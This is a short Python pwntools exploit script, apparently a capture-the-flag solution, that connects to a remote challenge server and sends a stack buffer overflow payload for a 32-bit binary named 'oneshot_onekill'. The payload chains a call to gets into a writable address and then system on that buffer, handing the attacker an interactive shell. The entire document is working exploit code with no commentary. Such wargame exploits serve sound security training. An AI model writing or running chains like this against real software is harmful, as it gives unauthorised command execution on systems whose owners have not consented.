#!/usr/bin/env python2

from pwn import *

elf = ELF('./oneshot_onekill')
#p = process('./oneshot_onekill')
p = remote('prob.vulnerable.kr', 20026)

system = elf.plt['system']
gets = elf.plt['gets']
pop_rbx = 0x08048399
rw = 0x0804a050
main = elf.symbols['main']

context.terminal = ['tmux', 'new-window']

p.recv()

context.bits = 32

payload = flat(
    'A'*304,
    gets,
    pop_rbx,
    rw,
    system,
    0xdeadbeef,
    rw
)

p.sendline(payload)

p.interactive()
